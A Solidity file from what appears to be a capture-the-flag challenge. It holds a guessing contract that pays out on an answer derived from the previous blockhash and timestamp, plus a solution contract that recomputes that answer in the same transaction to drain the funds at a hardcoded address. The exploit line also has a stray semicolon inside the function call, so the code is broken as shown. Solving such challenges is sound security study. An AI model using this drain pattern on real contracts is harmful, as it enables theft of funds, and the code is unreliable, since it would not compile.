pragma solidity ^0.4.21;

// can also import file

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract GuessTheNewNumberChallengeSolution {
    address watch_addr = 0xC2f0f4418Bc30aA83816b4E106334458c46B92f1;
    GuessTheNewNumberChallenge public a;
    
    function register() public payable{
        require(msg.value >= 1 ether, "not enough");
        //uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        a = GuessTheNewNumberChallenge(watch_addr);
        // one second difference matters.
        a.guess.value(1 ether)(uint8(keccak256(block.blockhash(block.number - 1), now)););
        
        
    }
    // fallback function
    function() external payable {}
}
